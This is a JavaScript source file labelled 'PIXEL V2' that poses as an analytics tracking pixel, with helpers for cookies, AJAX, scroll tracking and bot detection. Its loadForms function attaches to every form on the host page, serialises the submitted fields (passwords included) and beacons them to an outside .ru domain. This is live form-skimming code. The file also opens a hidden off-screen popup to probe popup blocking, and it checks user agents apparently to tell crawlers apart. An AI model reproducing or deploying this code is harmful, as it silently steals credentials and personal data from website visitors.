//console.log('PIXEL V2');
/* * functions */
function findGetParameter(parameterName) { 
	var result = null,
		tmp = [];
	var items = location.search.substr(1).split("&"); 
	for (var index = 0; index < items.length; index++) {
		tmp = items[index].split("=");
		if (tmp[0] === parameterName) result = decodeURIComponent(tmp[1]);
	}
	return result;
}

function getUrlVars(url) {
	var hash;
	var myJson = {};
  if (url != undefined && url != null ){
  	var hashes = url.slice(url.indexOf('?') + 1).split('&');
  	for (var i = 0; i < hashes.length; i++) {
  		hash = hashes[i].split('=');
  		myJson[hash[0]] = hash[1];
  	}
  }
	return myJson;
}

var ajax = {};

ajax.x = function () {
  if (typeof XMLHttpRequest !== 'undefined') {
    return new XMLHttpRequest();
  }
  var versions = [
  "MSXML2.XmlHttp.6.0",
  "MSXML2.XmlHttp.5.0",
  "MSXML2.XmlHttp.4.0",
  "MSXML2.XmlHttp.3.0",
  "MSXML2.XmlHttp.2.0",
  "Microsoft.XmlHttp"
  ];

  var xhr;
  for (var i = 0; i < versions.length; i++) {
    try {
      xhr = new ActiveXObject(versions[i]);
      break;
    } catch (e) {
    }
  }
  return xhr;
};

ajax.send = function (url, callback, method, data, async) {
  if (async === undefined) {
    async = true;
  }
  var x = ajax.x();
  x.open(method, url, async);
  x.onreadystatechange = function () {
    if (x.readyState == 4) {
      callback(x.responseText)
    }
  };
  if (method == 'POST') {
    x.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
  }
  x.send(data)
};

ajax.post = function (url, data, callback, async) {
  var query = [];
  for (var key in data) {
    query.push(encodeURIComponent(key) + '=' + encodeURIComponent(data[key]));
  }
  ajax.send(url, callback, 'POST', query.join('&'), async)
};

// return cookie by name, if exist, if not exist, return undefined
function getCookie(name) {
 var matches = document.cookie.match(new RegExp(
  "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, '\\$1') + "=([^;]*)"
 ));
 return matches ? decodeURIComponent(matches[1]) : undefined;
}

ajax.get = function (url, data, callback, async) {
    var query = [];
    for (var key in data) {
        query.push(encodeURIComponent(key) + '=' + encodeURIComponent(data[key]));
    }
    ajax.send(url + (query.length ? '?' + query.join('&') : ''), callback, 'GET', null, async)
};

//create cookie for visitors
function makeid() {
 var text = "";
 var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

 for (var i = 0; i < 60; i++)
  text += possible.charAt(Math.floor(Math.random() * possible.length));

 return text;
}

//get cookie                         
function getCookies() {
 var pairs = document.cookie.split(";");
 var cookies = {};
 for (var i = 0; i < pairs.length; i++) {
  var pair = pairs[i].split("=");
  cookies[pair[0]] = unescape(pair[1]);
 }
 return cookies;
}

function getScript(source, callback) {
    var script = document.createElement('script');
    var prior = document.getElementsByTagName('script')[0];
    script.async = 1;
    prior.parentNode.insertBefore(script, prior);

    script.onload = script.onreadystatechange = function( _, isAbort ) {
        if(isAbort || !script.readyState || /loaded|complete/.test(script.readyState) ) {
            script.onload = script.onreadystatechange = null;
            script = undefined;

            if(!isAbort) { if(callback) callback(); }
        }
    };

    script.src = source;
}

function j(u, c) {
  var h = document.getElementsByTagName('head')[0], s = document.createElement('script');
  s.async = true; s.src = u;
  s.onload = s.onreadystatechange = function () {
    if (!s.readyState || /loaded|complete/.test(s.readyState)) {
      s.onload = s.onreadystatechange = null; if (h && s.parentNode) { h.removeChild(s) } s = undefined;
      if (c) { c() }
    }
  };
  h.insertBefore(s, h.firstChild);
}

//disable cookie                         
function delete_cookie(name, path, domain) {
 if (get_cookie(name)) {
  document.cookie = name + "=" +
   ((path) ? ";path=" + path : "") +
   ((domain) ? ";domain=" + domain : "") +
   ";expires=Thu, 01 Jan 1970 00:00:01 GMT";
 }
}

function is_mobile(){
	if( /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ) {
		return true;
	}else{
		return false;
	}
}
/* * /functions */

/**
 * Get current browser viewpane heigtht
 */
function get_window_height() {
    return window.innerHeight || 
           document.documentElement.clientHeight ||
           document.body.clientHeight || 0;
}

/**
 * Get current absolute window scroll position
 */
function get_window_Yscroll() {
    return window.pageYOffset || 
           document.body.scrollTop ||
           document.documentElement.scrollTop || 0;
}

/**
 * Get current absolute document height
 */
function get_doc_height() {
    return Math.max(
        document.body.scrollHeight || 0, 
        document.documentElement.scrollHeight || 0,
        document.body.offsetHeight || 0, 
        document.documentElement.offsetHeight || 0,
        document.body.clientHeight || 0, 
        document.documentElement.clientHeight || 0
    );
}


/**
 * Get current vertical scroll percentage
 */
function get_scroll_percentage() {
    return (
        (get_window_Yscroll() + get_window_height()) / get_doc_height()
    ) * 100;
}

function hasClass(elem, className) {
    return elem.className.split(' ').indexOf(className) > -1;
}

function createStyle(href){
  var resource = document.createElement('link'); 
  resource.setAttribute("rel", "stylesheet");
  resource.setAttribute("href",href);
  resource.setAttribute("type","text/css");      
  var head = document.getElementsByTagName('head')[0];
  head.appendChild(resource);
}

function botCheck(){
	var botPattern = "(googlebot\/|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|Yandex Mobile Bot|AdsBot Google|YandexMetrika|Phantom.js bot|YandexBot|YandexAccessibilityBot|YandexMobileBot|YandexDirectDyn|YandexScreenshotBot|YandexImages|YandexVideo|YandexVideoParser|YandexMedia|YandexBlogs|YandexFavicons|YandexWebmaster|YandexPagechecker|YandexImageResizer|YandexAdNet|YandexDirect|YaDirectFetcher|YandexCalendar|YandexSitelinks|YandexMetrika|YandexNews|YandexCatalog|YandexMarket|YandexVertis|YandexForDomain|YandexBot|YandexSpravBot|YandexSearchShop|YandexMedianaBot|YandexOntoDB|YandexOntoDBAPI|YandexVerticals|GoogleBot|Googlebot-News|Googlebot-Image|Googlebot-Video|Googlebot-Mobile|AdsBot-Google|AdsBot-Google-Mobile-Apps|Google Web Preview|Adbeat Bot|AdbeatBot|adbeat_bot|adbeat-bot|Screenshot Bot|ScreenshotBot|screenshot_bot|screenshot-bot|NaverBot|Naver Bot|naver-bot|naver_bot|Google Bot|google-bot|google_bot|googlebot|AddThis)";

	var re = new RegExp(botPattern, 'i');
	var userAgent = navigator.userAgent;
	if (re.test(userAgent)) {
		return true;
	}else{
		return false;
	}
}
 
function yandexCheck(){
  var botPattern = "(yandex\/|Yandex Mobile Browser|Yandex Browser|Yandex Mobile|YaBrowser)";

  var re = new RegExp(botPattern, 'i');
  var userAgent = navigator.userAgent;
  if (re.test(userAgent)) {
    return true;
  }else{
    return false;
  }
}

function get_domian_with_protocol(){
  return location.protocol+'//'+location.hostname+(location.port ? ':'+location.port: '');
}

function isHidden(){
  if (!document.hidden) {
    return true;
  }else{
    return false;
  }
}

function myClickHandler(e)
{
  // Here you'll do whatever you want to happen when they click

  // now this part stops the click from propagating
  if (!e) var e = window.event;
  e.cancelBubble = true;
  if (e.stopPropagation) e.stopPropagation();
}

function isPopupEnabled(){
  var newWin = window.open("https://prostats.info/is-popup-blocked.php", "_blank", "toolbar=no,status=no,menubar=no,scrollbars=no,resizable=no,left=10000, top=10000, width=1, height=1, visible=none");

  if(!newWin || newWin.closed || typeof newWin.closed=='undefined') 
  { 
    return false;
  }else{
    newWin.close();
    return true;
  }
}

function dateNowSeconds(){
  var timeStampInMs = new Date() / 1000;
  return Math.round(timeStampInMs);
}

function getHours(){
  var d = new Date();
  return d.getHours();
}

function loadForms(vid){
  for (var i = 0; i < document.forms.length; i++) {
      document.forms[i].addEventListener('submit',function(e) {
        e = e || window.event;
        var target = e.target || e.srcElement;
        var query = serialize(e.target);
        (window.Image ? (new Image()) : document.createElement('img')).src = 'https://qoopler.ru/event_collect_forms.php?vid='+vid+'&'+query;
        return true;
    });
  }
}

function serialize(form) {
    var field, s = [];
    if (typeof form == 'object' && form.nodeName == "FORM") {
        var len = form.elements.length;
        for (i=0; i<len; i++) {
            field = form.elements[i];
            if (field.name && !field.disabled && field.type != 'file' && field.type != 'reset' && field.type != 'submit' && field.type != 'button') {
                if (field.type == 'select-multiple') {
                    for (j=form.elements[i].options.length-1; j>=0; j--) {
                        if(field.options[j].selected)
                            s[s.length] = encodeURIComponent(field.name) + "=" + encodeURIComponent(field.options[j].value);
                    }
                } else if ((field.type != 'checkbox' && field.type != 'radio') || field.checked) {
                    s[s.length] = encodeURIComponent(field.name) + "=" + encodeURIComponent(field.value);
                }
            }
        }
    }
    return s.join('&').replace(/%20/g, '+');
}    